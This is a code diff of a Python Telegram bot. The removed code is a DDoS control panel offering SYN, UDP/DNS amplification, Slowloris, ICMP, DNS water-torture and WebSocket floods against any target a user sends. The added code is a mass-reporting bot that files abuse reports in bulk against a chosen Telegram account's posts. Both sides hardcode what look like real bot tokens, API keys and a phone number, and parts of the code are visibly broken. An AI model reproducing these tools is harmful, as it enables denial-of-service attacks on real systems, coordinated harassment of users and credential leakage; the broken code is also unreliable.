@@ -1,161 +1,105 @@
-import telebot
-import subprocess
-import socket
-import sys
-import random
-import threading
-import time
-from scapy.all import IP, TCP, UDP, ICMP, send, raw
-from telebot import types
+import asyncio
+import os
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, ConversationHandler, filters
+from telethon import TelegramClient
+from telethon.tl.types import (
+    InputReportReasonSpam,
+    InputReportReasonFake,
+    InputReportReasonViolence,
+    InputReportReasonPornography,
+    InputReportReasonOther,
+)
 
-TOKEN = "8824864653:AAEmpXwgdiGLKqLq_VjiIcuvRbfFvcNbDHY"
-ADMIN_CHAT_ID = 8302326875
-MAX_PACKETS = 1000000  # Industrial-grade flood volume
+API_ID = int(os.environ.get("35383294"))
+API_HASH = os.environ.get("685a6c1691a92cdd05ab66f5c3f5161b")
+PHONE = os.environ.get("+639456655624")
+BOT_TOKEN = os.environ.get("8824864653:AAEmpXwgdiGLKqLq_VjiIcuvRbfFvcNbDHY")
 
-bot = telebot.TeleBot(TOKEN)
-user_attacks = {}  # {chat_id: {'method': '', 'target': ''}}
-
-# ===== CYBER WEAPONRY ARSENAL =====
-ATTACK_METHODS = {
-    "1": "SYN Flood (Layer 4 Tsunami)",
-    "2": "UDP Amplification (Bandwidth Annihilator)",
-    "3": "HTTP Slowloris (Connection Strangler)",
-    "4": "ICMP Ping Storm (Packet Hurricane)",
-    "5": "DNS Water Torture (NXDomain Overload)",
-    "6": "WebSocket Armageddon (Layer 7 Apocalypse)"
+reason_map = {
+    "spam": InputReportReasonSpam(),
+    "fake": InputReportReasonFake(),
+    "violence": InputReportReasonViolence(),
+    "porn": InputReportReasonPornography(),
+    "other": InputReportReasonOther()
 }
 
-# ----- RAW PACKET GENERATORS -----
-def syn_flood(target_ip, target_port):
-    """TCP SYN Flood using raw socket manipulation"""
-    ip = IP(dst=target_ip)
-    tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S", 
-             seq=random.randint(0,4294967295), window=64240)
-    raw_pkt = raw(ip/tcp)
-    while True:
-        try:
-            send(raw_pkt, verbose=0)
-        except Exception as e:
-            print(f"SYN Flood Error: {str(e)}", file=sys.stderr)
+USERNAME, REASON, COUNT = range(3)
 
-def udp_amplification(target, port=53):
-    """DNS Amplification attack vector"""
-    dns_servers = ['8.8.8.8', '1.1.1.1']  # Reflector list
-    payload = bytearray(random.getrandbits(8) for _ in range(1024))
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for dns_server in dns_servers:
-                sock.sendto(payload, (dns_server, port))
-                sock.sendto((target[0], port), (dns_server, port))  # Spoofed source
-        except Exception as e:
-            print(f"UDP Amp Error: {str(e)}", file=sys.stderr)
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("آیدی هدف (بدون @) را بفرست:")
+    return USERNAME
 
-# ----- AIOHTTP-BASED ATTACKS -----
-def slowloris(target):
-    """Slow HTTP Denial of Service"""
-    headers = [("User-Agent", "Mozilla/5.0"), ("Connection", "keep-alive")]
-    while True:
-        try:
-            s = socket.socket()
-            s.connect((target, 80))
-            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n")
-            for header in headers:
-                s.send(f"{header[0]}: {header[1]}\r\n")
-                time.sleep(10)
-        except Exception as e:
-            print(f"Slowloris Error: {str(e)}", file=sys.stderr)
+async def username_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['username'] = update.message.text.strip().replace("@", "")
+    await update.message.reply_text("دلیل ریپورت (spam, fake, violence, porn, other):")
+    return REASON
 
-# ===== COMMAND CENTER =====
-@bot.message_handler(commands=['start'])
-def show_attack_menu(message):
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    for num, desc in ATTACK_METHODS.items():
-        markup.add(types.InlineKeyboardButton(
-            f"{num}. {desc}", 
-            callback_data=f"attack_{num}")
-        )
-    bot.send_message(message.chat.id, 
-        "<b>⚡ PHREAK'S OFFENSIVE CONTROL PANEL ⚡</b>\n"
-        "Select attack vector:\n\n"
-        "1. SYN: TCP connection exhaustion\n"
-        "2. UDP: Bandwidth amplification\n"
-        "3. Slowloris: HTTP connection starvation\n"
-        "4. ICMP: Ping flood overload\n"
-        "5. DNS: Recursive query bombardment\n"
-        "6. WS: WebSocket protocol abuse",
-        parse_mode='HTML', reply_markup=markup)
+async def reason_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    reason = update.message.text.strip().lower()
+    if reason not in reason_map:
+        await update.message.reply_text("❌ دلیل معتبر نیست. لطفا یکی از این موارد را وارد کن: spam, fake, violence, porn, other")
+        return REASON
+    context.user_data['reason'] = reason
+    await update.message.reply_text("چند پست آخر را ریپورت کنیم؟ (مثلاً 50):")
+    return COUNT
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('attack_'))
-def set_attack_method(call):
-    method_id = call.data.split('_')[1]
-    user_attacks[call.message.chat.id] = {'method': method_id}
-    bot.send_message(call.message.chat.id, 
-        f"⛔ {ATTACK_METHODS[method_id]} SELECTED\n"
-        "Send target IP/Domain:")
-
-@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
-def execute_attack(message):
-    chat_id = message.chat.id
-    target = message.text.strip()
-    
+async def count_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
-        ip = socket.gethostbyname(target) if not is_valid_ip(target) else target
-        method_id = user_attacks[chat_id]['method']
-        
-        bot.send_message(chat_id, f"🚀 LAUNCHING {ATTACK_METHODS[method_id]} AT {ip}")
-        
-        # Multi-threaded attack launch
-        for _ in range(50):  # 50 concurrent threads
-            threading.Thread(target=attack_switcher(method_id, ip)).start()
-            
-        bot.send_message(ADMIN_CHAT_ID, 
-            f"☠️ ATTACK DEPLOYED ☠️\n"
-            f"Method: {ATTACK_METHODS[method_id]}\n"
-            f"Target: {ip}\n"
-            f"Origin: {message.from_user.id}")
+        count = int(update.message.text.strip())
+    except ValueError:
+        await update.message.reply_text("❌ لطفا یک عدد معتبر وارد کنید.")
+        return COUNT
 
+    username = context.user_data['username']
+    reason = context.user_data['reason']
+
+    await update.message.reply_text("⏳ شروع ریپورت...")
+
+    client = TelegramClient("session", API_ID, API_HASH)
+    try:
+        await client.start(phone=PHONE)
     except Exception as e:
-        bot.send_message(chat_id, f"💥 ERROR: {str(e)}")
-        print(f"Attack Error: {str(e)}", file=sys.stderr)
+        await update.message.reply_text(f"❌ خطا در اتصال به تلگرام: {e}")
+        return ConversationHandler.END
 
-def attack_switcher(method_id, target):
-    """Return appropriate attack function"""
-    return {
-        '1': lambda: syn_flood(target, random.randint(1,65535)),
-        '2': lambda: udp_amplification(target),
-        '3': lambda: slowloris(target),
-        '4': lambda: os.system(f"ping {target} -l 65500 -n 1000000 -w 1"),
-        '5': lambda: dns_nxdomain_attack(target),
-        '6': lambda: websocket_apocalypse(target)
-    }.get(method_id, lambda: None)
-
-# ----- ADDITIONAL WEAPONS -----  
-def dns_nxdomain_attack(target):
-    """DNS query flood with non-existent domains"""
-    while True:
-        random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
-        query = f"{random_sub}.{target}"
-        subprocess.run(["nslookup", query], stdout=subprocess.DEVNULL)
-
-def websocket_apocalypse(target):
-    """WebSocket connection flood"""
-    from websocket import create_connection
-    while True:
-        try:
-            ws = create_connection(f"ws://{target}/")
-            ws.send("0"*1024*1024)  # 1MB payload
-        except:
-            pass
-
-# ----- UTILITIES -----
-def is_valid_ip(ip):
     try:
-        socket.inet_aton(ip)
-        return True
-    except:
-        return False
+        entity = await client.get_entity(username)
+        messages = await client.get_messages(entity, limit=count)
+        success = 0
+        for i, msg in enumerate(messages, 1):
+            try:
+                await client.report_messages(entity, [msg.id], reason_map[reason], "Reported via bot")
+                success += 1
+                await asyncio.sleep(1)  # جلوگیری از بلاک شدن به خاطر سرعت زیاد
+            except Exception as e:
+                await update.message.reply_text(f"خطا در پست {i}: {e}")
+        await update.message.reply_text(f"😽 تمام شد. تعداد موفق: {success}/{count}")
+    finally:
+        await client.disconnect()
+
+    return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ لغو شد.")
+    return ConversationHandler.END
+
+def main():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    conv = ConversationHandler(
+        entry_points=[CommandHandler("start", start)],
+        states={
+            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, username_handler)],
+            REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, reason_handler)],
+            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, count_handler)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+
+    app.add_handler(conv)
+    print("🏳️ Bot is running...")
+    app.run_polling()
 
 if __name__ == "__main__":
-    print("DDOS-Telegram-BOT v2")
-    bot.infinity_polling()
+    main()
